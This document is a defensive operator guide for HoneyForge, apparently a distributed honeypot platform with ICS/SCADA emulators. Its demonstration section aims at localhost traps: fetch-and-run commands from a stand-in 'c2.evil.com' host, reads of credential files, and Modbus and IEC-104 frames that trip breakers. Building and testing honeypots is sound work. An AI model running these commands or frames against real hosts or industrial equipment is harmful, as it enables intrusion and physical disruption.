# HoneyForge: Comprehensive Architecture, ICS/SCADA Specification & Operator Guide

## 1. Executive Summary

**HoneyForge** is a next-generation distributed honeypot ecosystem designed for Blue Teams, SOCs, and Cyber-Physical Systems (CPS/OT) defense. It combines a centralized management server (written in Go) with lightweight, stealthy, autonomous honeypot agents (written in Rust).

HoneyForge bridges the gap between conventional low-interaction network deception and complex high-interaction industrial sandboxes. It delivers:
- **Centralized Command & Telemetry Ingestion**: Operators manage traps, inspect real-time intrusion feeds, track attacker sessions, and analyze captured binary payloads through a clean web interface and REST API.
- **Multi-Tier Deception Grid**: Spanning low-interaction port listeners, medium-interaction stateful dialogue emulators, high-interaction virtual filesystem environments, and specialized Industrial Control Systems (ICS / SCADA) protocols.
- **Unidirectional Stealth Telemetry**: An out-of-band communication channel using raw socket control (`SO_LINGER=0`, TCP RST), hybrid asymmetric envelope encryption (X25519 + ChaCha20-Poly1305), anti-replay caching, and traffic masquerading (`/cdn-cgi/rum`, `/v1/rgstr`, `/api/v2/metrics`), completely evading network socket tables and scanner detection.
- **Zero-Footprint Remote Fleet Lifecycle**: Automated remote deployment, health auditing, and decommissioning of honeypot agents across target hosts via SSH and systemd (`SSHDeployer`).
- **Resilient Offline Buffering**: Encrypted local disk spooling (`$HF_BUFFER_PATH`) preventing telemetry loss during network disruptions without exposing plaintext logs.

```
                    ┌──────────────────────── HoneyForge Server (Go) ────────────────────────┐
  Security          │  :8080 Operator Web UI ──┬─ Static Assets & Dashboard                 │
  Analyst / SOC ───►│                          └─ REST API (:8081) ──► PostgreSQL / In-Memory │
                    └───────────────────────────────────▲────────────────────────────────────┘
                                                        │  POST /cdn-cgi/rum (Encrypted Stealth Envelope)
                                                        │  POST /api/ingest  (Legacy JSON Telemetry)
                                Unidirectional Channel ─┘  HTTP 204 No Content Response
                                                        │
  Attacker / Probe ──► Decoy Service ──────── ┌─────────┴───────── HoneyForge Agent (Rust) ──────────┐
                       (SSH, Modbus, 104,     │  Single static binary, standalone JSON config         │
                        HTTP, FTP, VFS)       │  In-Memory VFS, Industrial State, Envelope Encryption │
                                              └───────────────────────────────────────────────────────┘
```

---

## 2. Honeypot Classification & Trap Architectures

HoneyForge categorizes deception assets into four specialized operational tiers:

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                               HoneyForge Deception Grid                                │
├────────────────────────────┬─────────────────────────────┬─────────────────────────────┤
│      Low Interaction       │     Medium Interaction      │      High Interaction       │
├────────────────────────────┼─────────────────────────────┼─────────────────────────────┤
│ • port_listener            │ • dialog                    │ • high_interaction          │
│ • banner                   │ • http                      │   - In-memory Linux VFS     │
│ • tarpit                   │ • honeytoken                │   - Session state tracking  │
│ • udp                      │ • medium_extra              │   - SHA-256 payload capture │
│ • low_extra                │   - Redis wire protocol     │   - Stealth command filter  │
│   - SSDP / UPnP discovery  │   - MQTT IoT telemetry      │   - Honeytoken tripwires    │
│   - Echo / Daytime / Probe │                             │                             │
├────────────────────────────┴─────────────────────────────┴─────────────────────────────┤
│                          ICS / SCADA Power & Automation Grid                            │
├──────────────────────────────────────────────────────────┬─────────────────────────────┤
│               iec104 (IEC 60870-5-104)                   │    scada (Modbus TCP & HMI) │
├──────────────────────────────────────────────────────────┼─────────────────────────────┤
│ • Power Substation Telecontrol (Port 2404)               │ • Modbus TCP Gateway (:502) │
│ • APCI: U-frames (STARTDT), I-frames, S-frames           │ • Holding/Input Registers   │
│ • ASDU: General Interrogation (C_IC_NA_1 / Type 100)     │ • Coils / Discrete Inputs   │
│ • Commands: Single (Type 45), Double (Type 46)           │ • MEI 14 Device ID Info     │
│ • Substation state tracking & measurement emulation      │ • Substation Web HMI & REST │
└──────────────────────────────────────────────────────────┴─────────────────────────────┘
```

### 2.1 Low Interaction Tier
Engineered for rapid reconnaissance detection, low memory footprint, and broad port coverage without state overhead.

- **`port_listener`**:
  - Listens across multiple individual ports or port ranges (e.g. `9000-9003,10443`).
  - Correlates incoming connections from the same source IP. If distinct port connections exceed `scan_threshold`, emits a high-confidence `scan` event.
  - Supports configurable actions: `read_then_close`, `instant_close`, or `keep_open`.
- **`banner`**:
  - Emulates protocols where the server speaks first (SSH, FTP, SMTP greeting banners).
  - Emits `connect` event, transmits configured static banner (e.g. `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10\r\n`), captures attacker's initial handshake input, emits `data` event, and disconnects.
- **`tarpit`**:
  - Defense-in-depth resource consumer (modeled after Endlessh).
  - Trickles single bytes or lines at configurable intervals (`delay_ms`, e.g. 10000ms), keeping automated scanners, brute-forcers, and crawlers trapped for hours (`max_hold_s`).
  - Supports modes: `ssh_banner` (endless SSH banner generation) and `http` (infinite chunked HTTP headers).
- **`udp`**:
  - High-performance asynchronous UDP responder handling datagram services: DNS (`helper: "dns"`), NTP, SSDP, SIP, or arbitrary regex rules.
  - Built-in amplification protection (`limit_amplification: true`, `max_replies_per_ip_min: 20`) preventing honeypots from being weaponized in reflection DDoS attacks.
- **`low_extra`**:
  - Responds to network discovery probes: SSDP / UPnP `M-SEARCH * HTTP/1.1` broadcasts, RFC 862 Echo, RFC 867 Daytime, RFC 864 Character Generator (Chargen), and generic TCP probes.

### 2.2 Medium Interaction Tier
Provides stateful protocol handshakes, captures credentials, and surfaces honeytokens without providing execution primitives.

- **`dialog`**:
  - Configurable regex-based dialogue state machine.
  - Supports text-based protocols (FTP, SMTP, Telnet, POP3, IMAP, Redis).
  - Rule-based transitions evaluate attacker commands (`^USER\s+(.*)$`, `^PASS\s?(.*)$`, `^AUTH`), emit credential events (`capture: "username"`, `capture: "password"`), and respond with protocol-accurate responses.
- **`http`**:
  - Emulates HTTP web services with virtual route dispatching.
  - Intercepts and parses login forms (`capture_login: true`), JSON authentication requests, and HTTP Basic `Authorization` headers.
  - Customizable HTTP server headers (`Apache/2.4.58`, `nginx/1.24.0`) and HTML/JSON responses.
- **`honeytoken`**:
  - Web beacon listener and canary trap.
  - Monitors access to decoy URLs (e.g. `/share/finance/passwords.xlsx`, `/api/v1/internal-token`). Any access immediately triggers a high-priority `token` alarm with client headers, IP, and user-agent.
- **`medium_extra`**:
  - **Redis Protocol**: Decodes both inline text commands and Redis Serialization Protocol (RESP) arrays (`*2\r\n$4\r\nAUTH...`). Handles `AUTH`, `INFO`, `CONFIG`, `SET`, `PING`, capturing database access credentials.
  - **MQTT Telemetry**: Decodes binary MQTT `CONNECT` packets (MQTT 3.1.1 and 3.1 MQIsdp), capturing Client IDs, usernames, passwords, and keep-alive intervals on port 1883.

### 2.3 High Interaction Tier (`high_interaction`)
Emulates an authentic interactive Linux shell session (SSH/Telnet) with strict containment:

- **Stateful In-Memory Virtual File System (VFS)**:
  - Complete hierarchical POSIX directory structure (`/bin`, `/sbin`, `/usr`, `/etc`, `/var/log`, `/tmp`, `/root`, `/home/operator`, `/proc`).
  - Realistic system configuration files: `/etc/passwd`, `/etc/os-release` (Ubuntu 22.04 LTS Jammy), `/etc/hosts`, `/etc/hostname` (`substation-gw01`), `/proc/version`, `/proc/uptime`, and simulated `/var/log/syslog`.
  - In-memory node mutations: supports `cd`, `ls -la`, `mkdir -p`, `touch`, `rm -rf`, `cp`, `mv`, `cat`, `head`, `tail`, `grep`, `pwd`.
- **Dynamic Terminal & Session State**:
  - Emulates bash session state: tracks current working directory (`self.cwd`), user (`root`), hostname, environment variables.
  - Interactive line discipline: handles backspace (`\x08`, `\x7f`), Carriage Return / Line Feed (`\r\n`), and updates the shell prompt dynamically (`root@substation-gw01:/var/log# `).
- **Automated SHA-256 Payload Interception**:
  - Intercepts malicious staging commands and file write primitives:
    - Shell redirections: `cat << 'EOF' > /tmp/mal.sh`, `echo "..." >> /tmp/script.sh`
    - Remote downloads: `curl http://attacker.com/payload.sh | sh`, `wget http://c2/bot -O /tmp/bot`
    - Base64 payload decoding: `echo "..." | base64 -d > /tmp/elf`
  - Computes cryptographic SHA-256 hash of the extracted payload, calculates byte size, extracts truncated sample, and emits both `command` and `payload` security events.
- **Tripwire Honeytoken Files**:
  - Embedded decoy assets: `/root/.env` (API keys, DB credentials), `/root/.ssh/id_rsa` (OpenSSH private key), `/etc/scada/plc_auth.conf` (PLC master secret).
  - Any command attempting to read, inspect, or copy these files (`cat`, `grep`, `head`, `nano`, `vi`, `strings`, `cp`) immediately triggers a `token` alert event.
- **Anti-Leak & Stealth Compliance**:
  - Commands used by attackers for reconnaissance (`ps`, `top`, `ss`, `netstat`, `env`, `whoami`, `id`, `uname -a`) return strictly sanitized output.
  - `ps` / `top` shows legitimate system services (`systemd`, `kthreadd`, `sshd`, `rsyslogd`, `cron`, `scada_agent`), never leaking `honeyforge` or Rust agent names.
  - `netstat` / `ss` hides agent telemetry sockets and displays only industrial and decoys ports.
  - `env` hides all `$HF_*` environment variables.

### 2.4 ICS / SCADA Substation & Industrial Automation Tier
Dedicated industrial protocol emulators specifically targeting critical infrastructure threats (OT/ICS).

#### A. IEC 60870-5-104 (`iec104`)
Standard telecontrol protocol used in electrical power grids, substations, and energy management systems (EMS):
- **Port**: `2404` (TCP).
- **APCI (Application Protocol Control Information) Framing**:
  - **U-format (Unnumbered)**: Session management frames `STARTDT ACT` (`0x07`) / `STARTDT CON` (`0x0B`), `STOPDT ACT` (`0x13`) / `STOPDT CON` (`0x23`), `TESTFR ACT` (`0x43`) / `TESTFR CON` (`0x83`).
  - **I-format (Information)**: Sequence-controlled data exchange tracking send sequence $N(S)$ and receive sequence $N(R)$.
  - **S-format (Supervisory)**: Acknowledgment frames tracking receive sequence $N(R)$.
- **ASDU (Application Service Data Unit) Support**:
  - **General Interrogation (Type 100 / `C_IC_NA_1`)**: Responds with station interrogation confirmation and interrogation termination, followed by complete substation telemetry snapshot.
  - **Single Command (Type 45 / `C_SC_NA_1`)**: Emulates circuit breaker operations at Information Object Address (IOA) `1001` (trip/close) and isolator switches at IOA `1002`.
  - **Double Command (Type 46 / `C_DC_NA_1`)**: Emulates two-state industrial actuators.
  - **Measured Values (Type 13 / `M_ME_NC_1`)**: Short floating-point telemetry for voltage (IOA `2001`, e.g. 220.5 kV), active power (IOA `2002`, e.g. 45.2 MW), and grid frequency (IOA `2003`, e.g. 50.0 Hz).
  - **Single-Point Status (Type 1 / `M_SP_NA_1`)**: Status flags with quality indicators.

#### B. Modbus TCP & SCADA Web HMI (`scada`)
Industrial PLC gateway emulating modern substation controllers (e.g. Schneider Electric Modicon M580 / ABB RTU):
- **Port**: `502` (TCP).
- **Process Memory Image**:
  - Holding Registers (`0..999`): Voltage (`220.00 V`), Current (`15.00 A`), Grid Frequency (`50.00 Hz`), Transformer Temperature (`68 °C`), Alarm Register (`0 = Normal`).
  - Input Registers (`0..999`): Read-only sensor values.
  - Coils (`0..999`): Main Breaker Q0 (`1 = Closed`, `0 = Tripped`), Cooling Fan (`1 = Auto`, `0 = Manual`).
  - Discrete Inputs (`0..999`): Breaker auxiliary contact, Substation door contact, Overcurrent alarm contact.
- **Supported Modbus Function Codes**:
  - `0x01` (Read Coils), `0x02` (Read Discrete Inputs), `0x03` (Read Holding Registers), `0x04` (Read Input Registers).
  - `0x05` (Write Single Coil), `0x06` (Write Single Register).
  - `0x0F` / 15 (Write Multiple Coils), `0x10` / 16 (Write Multiple Registers).
  - `0x2B` / 43 (MEI Type 14 - Read Device Identification): Vendor Name (`Schneider Electric`), Product Code (`Modicon M580`), Firmware Revision (`v4.10`).
- **Dual-Mode Automatic HTTP Fallback**:
  - If a client sends an HTTP request (`GET /`, `GET /api/tags`) to port 502 instead of binary Modbus frames, the trap automatically serves the **SCADA Web HMI**:
    - `GET /`: Interactive industrial HTML5 dashboard with real-time SVG breaker indicators, status badges, and telemetry meters.
    - `GET /api/tags`: REST endpoint outputting JSON sensor status and PLC tags.

---

## 3. Unidirectional Stealth Channel Specification

HoneyForge agents communicate with the server over an evasive unidirectional channel designed to leave no traces on the host system and resist scanner probing.

### 3.1 Network Evasion (`http_nolinger` & `udp_burst`)
- **`http_nolinger`**:
  - Implemented using low-level socket configuration (`socket2::Socket`).
  - Sets socket option `SO_LINGER` to zero (`Duration::ZERO`).
  - When the HTTP connection is closed, the Linux kernel immediately emits a `TCP RST` packet rather than undergoing the standard four-way `FIN-ACK` teardown.
  - **Zero Socket Table Footprint**: Completely bypasses the `TIME_WAIT` socket state. Running `netstat -an` or `ss -tlpn` on the compromised host reveals no persistent or lingering outbound connections to the server.
- **`udp_burst`**:
  - Stateless single-datagram telemetry transmission without calling socket `connect()`.
- **Traffic Masquerading**:
  - Telemetry is routed over paths resembling legitimate CDN or observability endpoints:
    - `/cdn-cgi/rum` (Cloudflare Real User Monitoring)
    - `/v1/rgstr` (Registration / Analytics beacon)
    - `/api/v2/metrics` (System metrics collector)
- **Scanner Resistance**:
  - The server unconditionally responds with `204 No Content` to stealth endpoints, regardless of whether the packet contained valid telemetry, invalid keys, or replayed traffic. Attackers scanning or fuzzing the endpoint receive no feedback.

### 3.2 Cryptographic Binary Envelope
Every telemetry payload is sealed in a binary envelope prior to network transmission:

```
┌─────────────────┬──────────────────┬─────────────────┬───────────────────────────────────────┐
│  KeyID (8 Bytes)│ Ephem_PK (32 B)  │ Nonce (12 Bytes)│ Ciphertext + Poly1305 Tag (N + 16 B)  │
└─────────────────┴──────────────────┴─────────────────┴───────────────────────────────────────┘
```

1. **KeyID (8 Bytes)**: First 8 bytes of `SHA-256(trap_token)`. Used by the center for $O(1)$ trap identification.
2. **Ephemeral Public Key (32 Bytes)**: Fresh curve point generated from an ephemeral X25519 private key.
3. **Nonce (12 Bytes)**: Cryptographically secure random 96-bit initialization vector (`rand_core`).
4. **Ciphertext & Poly1305 Tag ($N + 16$ Bytes)**:
   - Shared secret calculated via ECDH: $S = \text{X25519}(sk_{ephem}, pk_{server})$.
   - Symmetric key derived using HKDF-SHA256 with info `"honeyforge-telemetry-v1"`.
   - Plaintext payload: Inner JSON `{"t": token, "k": kind, "e": [events]}` compressed with **Gzip** (`flate2`).
   - Authenticated encryption using **ChaCha20-Poly1305** (`AEAD`).
5. **Memory Sanitization**:
   - The ephemeral X25519 private key implements `zeroize::ZeroizeOnDrop` and is securely wiped from memory immediately after sealing.

### 3.3 Anti-Replay Protection
- The server maintains a concurrency-safe, bounded LRU anti-replay cache (`ReplayCache`).
- A 52-byte unique replay key is derived from each envelope:
  $$\text{ReplayKey} = \text{hex}(\text{KeyID} \,\|\, \text{Ephem\_PK} \,\|\, \text{Nonce})$$
- If an envelope containing a previously recorded replay key is presented, the server rejects it with `ErrReplayDetected` and discards the payload while still returning `204 No Content`.

### 3.4 Resilient Encrypted Disk Buffering
- If the agent fails to reach the center (network disruption or firewall drop), events are not dropped.
- Telemetry envelopes are serialized as Base64 strings and appended to a local spool file.
- The spool file path is resolved via `$HF_BUFFER_PATH` (defaults to `/tmp/honeyforge-agent-buffer.dat`).
- **Security Guarantee**: Because envelopes are encrypted *before* reaching the buffer, **no plaintext JSON or sensitive threat data is ever stored on disk**.
- When network connectivity is restored, the buffer is drained and delivered in FIFO order.

---

## 4. Remote Fleet Deployment via `SSHDeployer`

HoneyForge provides automated, idempotent fleet management across target Linux machines through `internal/deploy/ssh.go`:

### 4.1 Lifecycle Operations
```
                 ┌──────────────────────────────────────────────────┐
                 │                SSHDeployer Client                │
                 └──────┬────────────┬───────────┬───────────┬──────┘
                        │            │           │           │
         Deploy Payload │     Status │   Restart │      Stop │   Uninstall
                        ▼            ▼           ▼           ▼
                 ┌──────────────────────────────────────────────────┐
                 │                 Target Linux Host                │
                 │  • /usr/local/bin/honeyforge-agent               │
                 │  • /etc/honeyforge/config.json                   │
                 │  • /etc/systemd/system/honeyforge-agent.service  │
                 └──────────────────────────────────────────────────┘
```

- **`Deploy(ctx, target, payload)`**:
  1. Validates local binary artifact, configuration JSON, and systemd service definition.
  2. Establishes SSH connection with exponential backoff retries.
  3. Executes pre-flight system verification (architecture, disk space, port availability).
  4. Uploads agent binary to `/tmp/hf_agent_bin`, moves to `/usr/local/bin/honeyforge-agent` (`chmod 0755`).
  5. Creates `/etc/honeyforge`, uploads `/etc/honeyforge/config.json` (`chmod 0644`).
  6. Installs `/etc/systemd/system/honeyforge-agent.service` (`chmod 0644`).
  7. Executes `systemctl daemon-reload && systemctl enable honeyforge-agent.service && systemctl restart honeyforge-agent.service`.
  8. Executes post-install health verification (`checkActiveState`).
- **`Status(ctx, target)`**:
  - Queries `systemctl is-active honeyforge-agent.service`.
  - Runs `ss -tlpn || netstat -tlpn` to verify active listening ports.
  - Queries system uptime via `systemctl show -p ActiveEnterTimestamp`.
  - Returns structured `ServiceStatus` (`Active`, `SubState`, `Loaded`, `ListeningPorts`, `Uptime`).
- **`Restart(ctx, target)`**:
  - Runs `systemctl restart honeyforge-agent.service` and verifies the unit returns to `active (running)`.
- **`Stop(ctx, target)`**:
  - Runs `systemctl stop honeyforge-agent.service`.
- **`Uninstall(ctx, target)`**:
  - Atomically stops and disables the systemd service.
  - Removes binary `/usr/local/bin/honeyforge-agent`, configuration directory `/etc/honeyforge`, and unit file.
  - Re-executes `systemctl daemon-reload`.

### 4.2 Systemd Service Unit Definition
```ini
[Unit]
Description=HoneyForge Honeypot Deception Agent
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/honeyforge-agent /etc/honeyforge/config.json
Restart=always
RestartSec=5s
LimitNOFILE=65535
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

---

## 5. Comprehensive Verification & Testing Guide

### 5.1 Go Backend Test Suite
Run all unit and integration tests from the workspace root:

```bash
# Run all Go package tests with verbose output
go test -v ./...

# Run individual subsystems
go test -v ./internal/handlers/    # API, Ingestion, Stealth routes & Replay tests
go test -v ./internal/deploy/      # SSHDeployer mock tests
go test -v ./internal/catalog/     # Catalog validation & preset schemas
go test -v ./internal/auth/        # Session and password auth tests

# Run PostgreSQL storage integration tests against a live database:
TEST_DB_DSN="postgres://honeyforge:honeyforge@localhost:5432/honeyforge?sslmode=disable" \
  go test -v ./internal/storage/
```

### 5.2 Rust Agent Test Suite
Run the Rust test suite covering all trap implementations:

```bash
cd agent

# Verify syntax and types
cargo check

# Run all 78+ unit and trap simulation tests
cargo test

# Run tests for specific trap modules:
cargo test -- traps::iec104           # IEC 60870-5-104 protocol tests
cargo test -- traps::scada            # Modbus TCP & Web HMI tests
cargo test -- traps::high_interaction # VFS, command execution & payload tests
cargo test -- traps::low_extra        # SSDP, Echo, Daytime tests
cargo test -- traps::medium_extra     # Redis & MQTT tests
cargo test -- crypto::                # X25519 & ChaCha20-Poly1305 envelope tests
cargo test -- sender::                # http_nolinger, buffer & jitter tests

# Build optimized release binary
cargo build --release
# Output binary: target/release/honeyforge-agent
```

---

## 6. Live Demonstration & Attack Simulation Script

The following copy-pasteable commands demonstrate attacks against each category of HoneyForge traps.

### 6.1 Low Interaction Demonstrations

#### A. SSH Banner Decoy (`banner`, Port 2222)
```bash
# Connect and send a dummy client SSH identification string
printf "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu1\r\n" | nc localhost 2222
# Result: Server banner is returned, connection logs are captured, and an event is emitted.
```

#### B. Multi-Port Port Scan (`port_listener`, Ports 9000-9003)
```bash
# Trigger scan detection by hitting 3 distinct ports in sequence
for port in 9000 9001 9002; do
  nc -z -w 1 localhost $port
done
# Result: HoneyForge correlates connections from the same IP and emits a 'scan' event.
```

#### C. Endless Tarpit (`tarpit`, Port 2223)
```bash
# Connect to the tarpit honeypot
nc -v localhost 2223
# Result: Client connection is held open; honeypot trickles random bytes slowly, exhausting client threads.
```

#### D. Decoy UDP DNS Service (`udp`, Port 1053)
```bash
# Query the honeypot DNS responder
dig @localhost -p 1053 test.example.com A
# Result: Emits UDP request event and returns configured simulated IP response without amplification risk.
```

#### E. UPnP / SSDP Discovery Reconnaissance (`low_extra`, Port 1900)
```bash
# Send SSDP M-SEARCH discovery probe
printf "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nST: upnp:rootdevice\r\nMX: 3\r\n\r\n" | nc -u localhost 1900
# Result: Logs SSDP probe event and returns decoy device description XML location.
```

---

### 6.2 Medium Interaction Demonstrations

#### A. FTP Credential Harvester (`dialog`, Port 2121)
```bash
# Simulate an automated FTP brute-force attack
printf "USER admin\r\nPASS Winter2026!SecOps\r\nSYST\r\nQUIT\r\n" | nc localhost 2121
# Result: Emits 'credential' event containing username 'admin' and password 'Winter2026!SecOps'.
```

#### B. HTTP Web Decoy & Form Interceptor (`http`, Port 8080)
```bash
# Submit stolen credentials to the decoy administrative login form
curl -i -X POST http://localhost:8080/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=secadmin&password=SuperSecretPassword99!"
# Result: Emits 'login' event capturing credentials and request metadata.
```

#### C. Honeytoken Canary Beacon (`honeytoken`, Port 8088)
```bash
# Access a planted canary file link
curl -i http://localhost:8088/share/finance/passwords.xlsx
# Result: Immediate high-priority 'token' alert emitted to SOC dashboard.
```

#### D. Redis Wire Protocol Probing (`medium_extra`, Port 6379)
```bash
# Send RESP formatted Redis authentication and info request
printf "*2\r\n\$4\r\nAUTH\r\n\$12\r\nsupersecret1\r\n*1\r\n\$4\r\nINFO\r\n" | nc localhost 6379
# Result: Emits 'credential' event capturing Redis auth token.
```

---

### 6.3 High Interaction Demonstrations (`high_interaction`)

Connect to the interactive honeypot terminal (e.g. port 2224):

```bash
nc localhost 2224
```

Once connected, run the following attack sequence:

```bash
# 1. System reconnaissance
id
whoami
uname -a
cat /etc/os-release

# 2. Filesystem interaction (Stateful VFS)
pwd
cd /tmp
echo "malicious_script_content = True" > malware.py
cat malware.py
ls -la

# 3. Tripwire Honeytoken Access (Triggers high-priority alerts!)
cat /root/.env
cat /root/.ssh/id_rsa
cat /etc/scada/plc_auth.conf

# 4. Automated Payload Interception (SHA-256 calculation)
curl -s http://c2.evil.com/dropper.sh | sh
wget http://c2.evil.com/rootkit.elf -O /tmp/rootkit.elf
echo "IyEvYmluL3NoCmVjaG8gIkhhY2tlZCIK" | base64 -d > /tmp/decoded_backdoor.sh

# 5. Stealth Evasion Verification
# Notice that honeyforge processes and ports are completely hidden!
ps aux
netstat -tlpn
env

# Exit session
exit
```

---

### 6.4 ICS / SCADA Demonstrations

#### A. Power Substation Telecontrol (`iec104`, Port 2404)
Run Python to trigger a full substation telecontrol exchange:

```python
import socket

# Connect to IEC-104 honeypot
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 2404))

# Step 1: Send U-frame STARTDT ACT (Start Data Transfer Activation)
s.sendall(bytes.fromhex('680407000000'))
resp = s.recv(1024)
print("[*] STARTDT Response (expect 68040b000000):", resp.hex())

# Step 2: Send General Interrogation (C_IC_NA_1, Type 100)
# Frame: APCI (I-format) + ASDU Type 100, COT=Activation(6), Common Addr=1, QOI=20
gi_frame = bytes.fromhex('680e0000000064010600010000000014')
s.sendall(gi_frame)
resp = s.recv(2048)
print("[*] General Interrogation Response Received (bytes):", len(resp))

# Step 3: Send Circuit Breaker Trip Single Command (C_SC_NA_1, Type 45, IOA 1001)
# Frame: APCI + ASDU Type 45, COT=6, Common Addr=1, IOA=1001 (0x03e9), Command=0 (Trip)
trip_cmd = bytes.fromhex('680e020002002d0106000100e9030000')
s.sendall(trip_cmd)
resp = s.recv(1024)
print("[*] Command Confirmation Response:", resp.hex())

s.close()
```

Or via bash / `nc`:
```bash
printf '\x68\x04\x07\x00\x00\x00' | nc localhost 2404 | xxd
```

#### B. Industrial Modbus TCP PLC Gateway (`scada`, Port 502)
Run Python to query substation registers and actuate coils:

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 502))

# 1. Read Holding Registers (Function Code 03, Addr 0, Quantity 5)
# Transaction ID: 0x0001, Proto: 0, Length: 6, Unit: 1, FC: 3, Addr: 0x0000, Qty: 0x0005
s.sendall(bytes.fromhex('000100000006010300000005'))
resp = s.recv(1024)
print("[*] Read Holding Registers Response:", resp.hex())

# 2. Write Single Coil - Trip Main Breaker Q0 (Function Code 05, Addr 0, Value 0x0000)
s.sendall(bytes.fromhex('000200000006010500000000'))
resp = s.recv(1024)
print("[*] Trip Breaker Q0 Response:", resp.hex())

# 3. Read Device Identification (MEI 14, FC 43 / 0x2B)
s.sendall(bytes.fromhex('000300000005012b0e0100'))
resp = s.recv(1024)
print("[*] Device Identification (Schneider Electric Modicon M580):", resp)

s.close()
```

#### C. SCADA Substation Web HMI & REST API (`scada`, Port 502)
The Modbus port features dual-mode automatic HTTP protocol detection:

```bash
# 1. Fetch live Substation Web HMI dashboard HTML
curl -i http://localhost:502/

# 2. Fetch live Substation telemetry tags JSON
curl -i http://localhost:502/api/tags
```
Sample REST response:
```json
{
  "device": "Schneider Electric Modicon M580",
  "firmware": "v4.10",
  "status": "OPERATIONAL",
  "tags": {
    "voltage_v": 220.0,
    "current_a": 15.0,
    "frequency_hz": 50.0,
    "temperature_c": 68,
    "alarm": 0,
    "breaker_q0": "CLOSED",
    "cooling_fan": "AUTO"
  }
}
```

---

## 7. Configuration Reference

Sample complete agent configuration (`config.json`):

```json
{
  "center_url": "http://127.0.0.1:8080",
  "token": "d98f7e2c-4b1a-4d2e-9c1a-8f3b5e7d9a1c",
  "server_pub": "a4b2c1d3e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0",
  "transport": "http_nolinger",
  "stealth_paths": ["/cdn-cgi/rum", "/v1/rgstr", "/api/v2/metrics"],
  "jitter_pct": 20.0,
  "heartbeat_interval_s": 30.0,
  "trap": {
    "class": "scada",
    "bind": "0.0.0.0",
    "port": 502,
    "params": {
      "vendor_name": "Schneider Electric",
      "product_code": "Modicon M580",
      "revision": "v4.10",
      "response_delay_ms": "10-25"
    }
  }
}
```
